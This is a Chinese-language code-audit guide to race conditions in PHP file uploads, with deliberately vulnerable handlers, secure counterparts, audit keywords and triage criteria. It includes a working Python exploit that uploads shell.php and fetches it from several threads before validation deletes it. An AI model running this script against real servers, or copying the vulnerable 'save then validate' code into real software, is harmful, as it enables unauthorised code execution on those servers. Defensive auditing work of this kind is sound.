# PHP｜文件上传竞态条件漏洞

## Details

### 漏洞成因
PHP文件上传处理中，当应用采用"先上传后验证"或"先保存后处理"的模式时，存在时间窗口攻击面。典型的场景是：服务器先将上传文件保存到临时目录或上传目录，然后再进行类型验证、病毒扫描、尺寸调整等处理。在这个时间差内，攻击者可以通过并发请求访问已上传但尚未验证的文件，实现恶意代码执行。这种竞态条件漏洞在文件上传、图片处理、文档转换等场景中尤为常见。

### 代码示例

**易受攻击的代码 - 先保存后验证（Pass-18类型）：**
```php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $file = $_FILES['upload'];
    $upload_dir = __DIR__ . '/uploads/';
    $target_file = $upload_dir . $file['name'];
    
    // 1. 先移动文件到上传目录（危险！）
    if (move_uploaded_file($file['tmp_name'], $target_file)) {
        echo "File uploaded successfully. Processing...<br>";
        
        // 2. 延迟验证（模拟处理时间）
        sleep(2); // 模拟文件处理、病毒扫描等
        
        // 3. 验证文件类型（为时已晚）
        $image_info = getimagesize($target_file);
        if ($image_info === false) {
            unlink($target_file); // 删除无效文件
            die('Invalid image file');
        }
        
        echo "File validation passed.";
    }
}
```

**易受攻击的代码 - 异步处理模式：**
```php
// 上传处理文件 upload.php
$upload_dir = __DIR__ . '/uploads/';
$target_file = $upload_dir . $_FILES['file']['name'];

// 立即保存文件
if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
    // 记录处理任务到队列
    file_put_contents('processing_queue.txt', $target_file . "\n", FILE_APPEND);
    echo "File uploaded and queued for processing.";
}

// 后台处理脚本 processor.php（通过cron或守护进程运行）
$queue_file = 'processing_queue.txt';
$files = file($queue_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

foreach ($files as $file) {
    if (file_exists($file)) {
        // 延迟验证和处理
        $image_info = getimagesize($file);
        if ($image_info === false) {
            unlink($file); // 删除无效文件
        }
    }
}

// 清空队列
file_put_contents($queue_file, '');
```

**攻击示例 - 竞态条件利用：**
```python
import requests
import threading
import time

# 上传恶意文件
def upload_file():
    url = "http://target.com/upload.php"
    files = {'upload': ('shell.php', '<?php phpinfo(); ?>', 'image/jpeg')}
    data = {'submit': 'Upload'}
    
    response = requests.post(url, files=files, data=data)
    print(f"Upload response: {response.text}")

# 并发访问上传的文件
def access_file():
    time.sleep(0.1)  # 等待文件上传
    file_url = "http://target.com/uploads/shell.php"
    
    for i in range(10):  # 多次尝试访问
        try:
            response = requests.get(file_url)
            if 'phpinfo' in response.text:
                print(f"SUCCESS: File accessed at attempt {i+1}")
                return True
        except:
            pass
        time.sleep(0.2)
    
    print("FAILED: Could not access file")
    return False

# 并发执行上传和访问
if __name__ == "__main__":
    # 启动上传线程
    upload_thread = threading.Thread(target=upload_file)
    upload_thread.start()
    
    # 启动多个访问线程
    access_threads = []
    for i in range(5):
        t = threading.Thread(target=access_file)
        t.start()
        access_threads.append(t)
    
    # 等待所有线程完成
    upload_thread.join()
    for t in access_threads:
        t.join()
```

**安全示例 - 原子操作验证：**
```php
$file = $_FILES['upload'];
$tmp_name = $file['tmp_name'];
$upload_dir = __DIR__ . '/uploads/';

// 1. 先在临时位置进行验证
$is_valid = false;
$image_info = getimagesize($tmp_name);
if ($image_info !== false) {
    $allowed_types = [IMAGETYPE_JPEG, IMAGETYPE_PNG, IMAGETYPE_GIF];
    if (in_array($image_info[2], $allowed_types)) {
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $mime_type = finfo_file($finfo, $tmp_name);
        finfo_close($finfo);
        
        if (in_array($mime_type, ['image/jpeg', 'image/png', 'image/gif'])) {
            $is_valid = true;
        }
    }
}

// 2. 验证通过后才移动到最终位置
if ($is_valid) {
    // 生成随机文件名
    $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    $new_filename = bin2hex(random_bytes(16)) . '.' . $ext;
    $final_path = $upload_dir . $new_filename;
    
    // 原子操作：验证通过后立即移动
    if (move_uploaded_file($tmp_name, $final_path)) {
        // 设置安全权限
        chmod($final_path, 0644);
        echo "File uploaded and validated successfully.";
    } else {
        die('Failed to move uploaded file');
    }
} else {
    die('File validation failed');
}
```

**安全示例 - 基于文件锁的并发控制：**
```php
class SafeUploadHandler {
    private $upload_dir;
    private $lock_file;
    
    public function __construct($upload_dir) {
        $this->upload_dir = $upload_dir;
        $this->lock_file = $upload_dir . 'upload.lock';
    }
    
    public function handleUpload($file) {
        // 获取文件锁
        $fp = fopen($this->lock_file, 'c');
        if (!flock($fp, LOCK_EX)) {
            die('Cannot obtain upload lock');
        }
        
        try {
            $tmp_name = $file['tmp_name'];
            $original_name = $file['name'];
            
            // 1. 在锁保护下进行验证
            if (!$this->validateFile($tmp_name)) {
                throw new Exception('File validation failed');
            }
            
            // 2. 生成唯一文件名
            $ext = strtolower(pathinfo($original_name, PATHINFO_EXTENSION));
            $new_filename = bin2hex(random_bytes(16)) . '.' . $ext;
            $target_path = $this->upload_dir . $new_filename;
            
            // 3. 原子移动
            if (!move_uploaded_file($tmp_name, $target_path)) {
                throw new Exception('Failed to move file');
            }
            
            // 4. 立即设置安全属性
            chmod($target_path, 0644);
            
            echo "Upload successful: " . htmlspecialchars($new_filename);
            
        } finally {
            // 释放锁
            flock($fp, LOCK_UN);
            fclose($fp);
        }
    }
    
    private function validateFile($tmp_name) {
        // 多重验证
        $image_info = getimagesize($tmp_name);
        if ($image_info === false) return false;
        
        $allowed_types = [IMAGETYPE_JPEG, IMAGETYPE_PNG, IMAGETYPE_GIF];
        if (!in_array($image_info[2], $allowed_types)) return false;
        
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $mime_type = finfo_file($finfo, $tmp_name);
        finfo_close($finfo);
        
        $allowed_mimes = ['image/jpeg', 'image/png', 'image/gif'];
        return in_array($mime_type, $allowed_mimes);
    }
}

// 使用示例
$handler = new SafeUploadHandler(__DIR__ . '/uploads/');
$handler->handleUpload($_FILES['upload']);
```

### 快速定位技巧

#### 核心操作定位（审计等级：L1-L2）
**关键词扫描：**
- 文件移动：`move_uploaded_file`, `rename`, `copy`
- 时间延迟：`sleep`, `usleep`, `time()`, `microtime()`
- 文件检查：`file_exists`, `is_file`, `getimagesize`
- 队列处理：`file_put_contents`, `file_get_contents`

**定位步骤：**
1. 搜索上传处理逻辑，检查文件移动和验证的顺序
2. 确认是否存在时间延迟或异步处理
3. 验证是否有并发控制机制

#### 保护机制定位（审计等级：L2-L3）
**检查是否存在：**
- **先验证后移动：** 在临时文件位置完成所有验证
- **原子操作：** 验证通过后立即执行move_uploaded_file
- **并发控制：** 使用文件锁或其他同步机制
- **临时文件：** 使用安全的临时目录进行预处理

**定位技巧：**
- 检查是否存在`move_uploaded_file`之前的验证逻辑
- 确认是否使用文件锁（`flock`）或其他同步机制
- 验证是否生成随机文件名避免预测

#### 审计等级标注
| 场景 | 审计等级 | 说明 |
|------|----------|------|
| 先验证后移动+原子操作 | **L0（快速跳过）** | 风险低 |
| 有验证但存在时间窗口 | **L2（跳读）** | 需评估时间差 |
| 先移动后验证 | **L3（逐行读）** | 高风险 |
| 异步处理无同步机制 | **L4（跨模块追踪）** | 需全链路分析 |

## Classify

### 研判标准

#### 确认漏洞
需满足：
1. 采用"先保存后验证"的处理模式
2. 存在可探测的时间窗口（延迟、异步处理）
3. 上传目录可执行脚本或可访问
4. 缺少并发访问控制机制

#### 误报
以下情景可判定为误报：
1. 采用"先验证后移动"的原子操作模式
2. 使用文件锁或其他同步机制控制并发
3. 验证过程在临时文件位置完成
4. 上传目录禁止脚本执行

#### 代码异味
需记录的风险：
1. 存在明显的处理延迟（sleep、外部API调用）
2. 使用队列异步处理但无同步保护
3. 文件名可预测或使用原始名称
4. 缺少错误处理和回滚机制

## Low risk

### 低风险评级场景

#### 1. 原子操作模式
- **场景：** 验证通过后立即执行move_uploaded_file
- **风险评估：** 消除竞态条件时间窗口

#### 2. 文件锁保护
- **场景：** 使用flock或其他机制控制并发访问
- **风险评估：** 防止并发攻击

#### 3. 随机文件名
- **场景：** 使用不可预测的文件名
- **风险评估：** 增加攻击难度

### 竞态条件攻击时间窗口分析

| 攻击阶段 | 时间窗口 | 攻击方法 | 防护策略 |
|----------|----------|----------|----------|
| 文件上传 | 毫秒级 | 快速访问 | 原子操作 |
| 验证延迟 | 秒级 | 并发访问 | 减少延迟 |
| 异步处理 | 分钟级 | 队列投毒 | 同步验证 |
| 批处理 | 小时级 | 定时访问 | 预处理验证 |

### 常见绕过技术总结

| 绕过技术 | 适用场景 | 检测方法 | 防护建议 |
|----------|----------|----------|----------|
| 时间竞态 | 验证延迟 | 代码审计 | 原子操作 |
| 并发投毒 | 异步处理 | 压力测试 | 文件锁 |
| 预测访问 | 可预测命名 | 逻辑分析 | 随机命名 |
| 条件触发 | 复杂处理 | 时序分析 | 简化流程 |

### 风险降级条件总结
| 条件 | 降级理由 | 建议优先级 |
|------|----------|------------|
| 原子操作验证 | 消除时间窗口 | 高 |
| 并发控制机制 | 防止竞态攻击 | 高 |
| 随机文件命名 | 增加预测难度 | 中 |
| 最小化处理时间 | 减少攻击窗口 | 中 |